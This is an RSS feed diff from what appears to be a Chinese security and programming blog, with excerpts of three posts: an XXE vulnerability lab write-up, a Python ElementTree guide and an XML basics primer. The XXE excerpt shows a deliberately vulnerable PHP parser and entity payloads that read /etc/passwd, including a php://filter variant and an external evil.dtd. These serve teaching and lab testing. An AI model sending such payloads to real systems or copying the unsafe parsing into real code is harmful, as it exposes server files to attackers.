@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>xml on </title>
+    <link>https://wyb0.com/tags/xml/</link>
+    <description>Recent content in xml on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 09 Dec 2017 23:02:22 +0800</lastBuildDate>
+    
+	<atom:link href="https://wyb0.com/tags/xml/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>XXE漏洞</title>
+      <link>https://wyb0.com/posts/2017/xxe/</link>
+      <pubDate>Sat, 09 Dec 2017 23:02:22 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2017/xxe/</guid>
+      <description>0x00 XXE XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛
+外部引用时可能会出现XXE漏洞，XXE漏洞是针对使用XML交互的Web应用程序的攻击方法
+0x01 示例代码 实验环境：https://github.com/vulhub/vulhub/tree/master/php/php_xxe
+simplexml_load_string.php
+&amp;lt;?php $data = file_get_contents(&#39;php://input&#39;); $xml = simplexml_load_string($data); echo $xml-&amp;gt;name;  0x02 判断是否有xxe漏洞 0x03 读取文件  外部引用读取passwd  &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE xxe [ &amp;lt;!ELEMENT name ANY &amp;gt; &amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt; ]&amp;gt; &amp;lt;root&amp;gt; &amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt; &amp;lt;/root&amp;gt;  &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE xxe [ &amp;lt;!ELEMENT name ANY &amp;gt; &amp;lt;!ENTITY xxe SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&amp;quot;&amp;gt; ]&amp;gt; &amp;lt;root&amp;gt; &amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt; &amp;lt;/root&amp;gt;   外部引用dtd文件读取passwd  evil.dtd中的内容为：&amp;lt;!ENTITY b SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;</description>
+    </item>
+    
+    <item>
+      <title>使用Python读写xml文件</title>
+      <link>https://wyb0.com/posts/2017/python-read-and-write-xml/</link>
+      <pubDate>Thu, 20 Jul 2017 14:20:26 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2017/python-read-and-write-xml/</guid>
+      <description>0x00 解析XML的方法  SAX (simple API for XML)
+python 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调用用户定义的回调函数来处理XML文件。
+ DOM(Document Object Model)
+将XML数据在内存中解析成一个树，通过对树的操作来操作XML。
+ ElementTree(元素树)
+ElementTree就像一个轻量级的DOM，具有方便友好的API。代码可用性好，速度快，消耗内存少。
+   我在这里使用ElementTree  0x01 Element对象的属性 每个Element对象都具有以下属性：
+ tag：string对象，表示数据代表的种类 attrib：dictionary对象，表示附有的属性 text：string对象，表示element的内容 tail：string对象，表示element闭合之后的尾迹 若干子元素（child elements）  &amp;gt;&amp;gt;&amp;gt; from xml.etree import ElementTree as ET &amp;gt;&amp;gt;&amp;gt; xml = &amp;quot;&amp;quot;&amp;quot;&amp;lt;books&amp;gt; ... &amp;lt;book id=&#39;37476&#39;&amp;gt;aaaa&amp;lt;/book&amp;gt; ... &amp;lt;book id=&#39;83727&#39;&amp;gt;bbbb&amp;lt;/book&amp;gt; ... &amp;lt;/books&amp;gt;&amp;quot;&amp;quot;&amp;quot; &amp;gt;&amp;gt;&amp;gt; root = ET.fromstring(xml) &amp;gt;&amp;gt;&amp;gt; root.tag &#39;books&#39; &amp;gt;&amp;gt;&amp;gt; child = root.getchildren() &amp;gt;&amp;gt;&amp;gt; child [&amp;lt;Element &#39;book&#39; at 0x106f59410&amp;gt;, &amp;lt;Element &#39;book&#39; at 0x106f59450&amp;gt;] &amp;gt;&amp;gt;&amp;gt; child[0].</description>
+    </item>
+    
+    <item>
+      <title>XML基础</title>
+      <link>https://wyb0.com/posts/2016/xml-basis/</link>
+      <pubDate>Wed, 25 May 2016 13:59:59 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2016/xml-basis/</guid>
+      <description>0x00 XML简介 1、xml的设计宗旨是传输数据，而并非显示数据
+2、xms是不作为的，它被设计用来结构化、存储以及传输信息
+3、xml只是纯文本，独立于软硬件和应用程序
+4、xml可供任何软硬设备读取数据
+5、xml可以自定义标签
+6、xml具有自我描述性
+7、xml是对html的补充
+8、xml常用于简化数据的存储和共享
+0x01 XML语法规则 1、所有元素必有闭合标签
+2、标签对大小写敏感
+3、必须正确的嵌套
+4、XML必须有根元素，根节点可以有子节点
+5、XML的属性值必须加引号(能用子元素的就用子元素代替属性)
+6、空格会被保留
+7、XML以LF存储换行
+8、注释使用&amp;lt;!-- --&amp;gt;
+9、实体引用
+&amp;amp;lt; &amp;lt; 小于 &amp;amp;gt; &amp;gt; 大于 &amp;amp;amp; &amp;amp; 和号 &amp;amp;apos; &#39; 单引号 &amp;amp;quot; &amp;quot; 引号  0x02 XML格式 &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &amp;lt;!--xml声明--&amp;gt; &amp;lt;!--文档类型定义--&amp;gt; &amp;lt;!DOCTYPE note [ &amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt; &amp;lt;!ELEMENT to (#PCDATA)&amp;gt; &amp;lt;!-- 定义to标签中元素的类型　--&amp;gt; &amp;lt;!ELEMENT from (#PCDATA)&amp;gt; &amp;lt;!ELEMENT heading (#PCDATA)&amp;gt; &amp;lt;!ELEMENT body (#PCDATA)&amp;gt; ]&amp;gt; &amp;lt;!--文档元素--&amp;gt; &amp;lt;note&amp;gt; &amp;lt;to&amp;gt;Tom&amp;lt;/to&amp;gt; &amp;lt;from&amp;gt;John&amp;lt;/from&amp;gt; &amp;lt;heading&amp;gt;Reminder&amp;lt;/heading&amp;gt; &amp;lt;body&amp;gt;Hi,I’am John&amp;lt;/body&amp;gt; &amp;lt;/note&amp;gt;  0x03 XML示例 例子一：John给George的便签</description>
+    </item>
+    
+  </channel>
+</rss>
